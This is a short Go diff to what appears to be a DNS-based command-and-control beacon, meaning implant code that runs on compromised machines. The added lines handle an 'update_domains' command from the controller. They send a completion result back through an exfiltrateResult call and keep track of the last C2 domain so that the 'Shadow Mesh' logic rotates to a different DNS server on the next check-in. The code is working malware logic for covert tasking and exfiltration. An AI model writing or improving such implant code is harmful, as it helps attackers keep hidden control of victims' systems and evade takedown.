@@ -402,12 +402,25 @@ func (b *Beacon) runBeacon() {
 			// Check for special commands
 			if strings.HasPrefix(command, "update_domains:") {
 				// Special system command to update DNS domain list
+				// Store the domain that sent this task so we can avoid it next time
+				b.client.mutex.Lock()
+				domainThatSentUpdate := b.client.lastDomain
+				b.client.mutex.Unlock()
+
+				// Update the domain list
 				b.handleUpdateDomains(command[15:]) // Skip "update_domains:" prefix
 
-				// Send success acknowledgment (best-effort, no retries)
-				// The new DNS servers may not recognize the task ID, which is fine
-				// We just notify completion and move on to normal check-ins
+				// Send success acknowledgment back to the ORIGINAL domain (the one that sent the task)
+				// This ensures the DNS server that issued the command knows it was completed
 				_ = b.exfiltrateResult("domains_updated", taskID)
+
+				// CRITICAL: Keep lastDomain set to the domain that sent the update
+				// This ensures selectDomain's Shadow Mesh logic will pick a DIFFERENT domain
+				// for the next check-in, preventing us from immediately going back to the
+				// same DNS server that might still have the task in its database
+				b.client.mutex.Lock()
+				b.client.lastDomain = domainThatSentUpdate
+				b.client.mutex.Unlock()
 
 				// Continue to next check-in cycle immediately
 				continue
